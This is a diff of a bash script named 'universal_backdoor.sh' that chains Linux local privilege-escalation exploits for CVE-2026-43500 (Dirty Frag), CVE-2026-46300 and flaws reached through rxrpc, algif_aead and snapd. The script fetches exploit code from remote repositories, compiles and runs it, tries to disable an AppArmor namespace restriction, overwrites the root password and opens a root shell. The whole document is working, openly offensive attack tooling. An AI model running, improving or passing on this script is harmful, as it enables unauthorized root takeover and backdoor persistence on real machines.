@@ -1,5 +1,5 @@
 #!/bin/bash
-# universal_backdoor.sh - Minimal output version
+# universal_backdoor.sh - Fixed version
 
 set -euo pipefail
 
@@ -19,7 +19,7 @@ cleanup() {
 }
 trap cleanup EXIT INT TERM
 
-# Already root?
+# === ПРОВЕРКА ROOT В САМОМ НАЧАЛЕ ===
 if [ "$EUID" -eq 0 ]; then
     echo "[+] Already root"
     echo "root:${NEW_PASSWORD}" | chpasswd 2>/dev/null
@@ -28,6 +28,7 @@ if [ "$EUID" -eq 0 ]; then
     else
         echo "[-] Password change failed"
     fi
+    echo "[+] Spawning root shell..."
     /bin/bash -i
     exit 0
 fi
@@ -40,18 +41,18 @@ run_dirtyfrag() {
     if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
         return 1
     fi
-    
-    # Check rxrpc module (loaded by default on Ubuntu)
-    local kernel=$(uname -r)
-    if ! lsmod 2>/dev/null | grep -q rxrpc && \
-       ! grep -q rxrpc "/lib/modules/$kernel/modules.builtin" 2>/dev/null; then
+
+    # Check rxrpc module
+    if ! lsmod 2>/dev/null | grep -q rxrpc; then
         return 1
     fi
-    
+
     git clone --depth 1 "$DIRTYFRAG_REPO" dirtyfrag 2>/dev/null
     cd dirtyfrag
     gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null
-    [ -f exp ] && ./exp 2>/dev/null
+    if [ -f exp ]; then
+        ./exp 2>/dev/null
+    fi
     [ "$EUID" -eq 0 ]
 }
 
@@ -60,17 +61,17 @@ run_copyfail() {
     if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
         return 1
     fi
-    
-    local kernel=$(uname -r)
-    if ! lsmod 2>/dev/null | grep -q algif_aead && \
-       ! grep -q algif_aead "/lib/modules/$kernel/modules.builtin" 2>/dev/null; then
+
+    if ! lsmod 2>/dev/null | grep -q algif_aead; then
         return 1
     fi
-    
+
     git clone --depth 1 "$COPYFAIL_REPO" copyfail 2>/dev/null
     cd copyfail
     gcc -o exploit exploit.c utils.c -Wall 2>/dev/null
-    [ -f exploit ] && ./exploit 2>/dev/null
+    if [ -f exploit ]; then
+        ./exploit 2>/dev/null
+    fi
     [ "$EUID" -eq 0 ]
 }
 
@@ -79,14 +80,15 @@ run_fragnesia() {
     if ! command -v git &>/dev/null; then
         return 1
     fi
-    
-    # Disable AppArmor restriction
-    [ -f /proc/sys/kernel/apparmor_restrict_unprivileged_userns ] && \
+
+    # Try to disable AppArmor (may fail without root)
+    if [ -w /proc/sys/kernel/apparmor_restrict_unprivileged_userns ]; then
         echo 0 > /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null
-    
+    fi
+
     git clone --depth 1 "$FRAGNESIA_REPO" fragnesia 2>/dev/null
     cd fragnesia
-    
+
     if command -v python3 &>/dev/null && [ -f CVE-2026-46300.py ]; then
         chmod +x CVE-2026-46300.py
         timeout 30 python3 CVE-2026-46300.py 2>/dev/null
@@ -94,7 +96,7 @@ run_fragnesia() {
         chmod +x CVE-2026-46300.sh
         timeout 30 bash CVE-2026-46300.sh 2>/dev/null
     fi
-    
+
     [ "$EUID" -eq 0 ]
 }
 
@@ -103,21 +105,24 @@ run_snapd() {
     if ! command -v git &>/dev/null || ! command -v gcc &>/dev/null; then
         return 1
     fi
-    
+
     if ! command -v snap &>/dev/null; then
         return 1
     fi
-    
+
     git clone --depth 1 "$SNAPD_REPO" snapd_exp 2>/dev/null
     cd snapd_exp/src
     gcc -o firefox_2404 firefox_2404.c 2>/dev/null
     gcc -o librootshell.so -shared -fPIC librootshell.c 2>/dev/null
-    [ -f firefox_2404 ] && timeout 60 ./firefox_2404 2>/dev/null
+    if [ -f firefox_2404 ]; then
+        timeout 60 ./firefox_2404 2>/dev/null
+    fi
     [ "$EUID" -eq 0 ]
 }
 
 # ==================== MAIN ====================
-# Try exploits in order
+echo "[*] Starting exploits..."
+
 if run_dirtyfrag; then
     echo "[+] CVE-2026-43500 (Dirty Frag) succeeded"
     SUCCESS=1
@@ -132,7 +137,6 @@ elif run_snapd; then
     SUCCESS=1
 fi
 
-# Post-root actions
 if [ $SUCCESS -eq 1 ]; then
     echo "root:${NEW_PASSWORD}" | chpasswd 2>/dev/null
     if [ $? -eq 0 ]; then
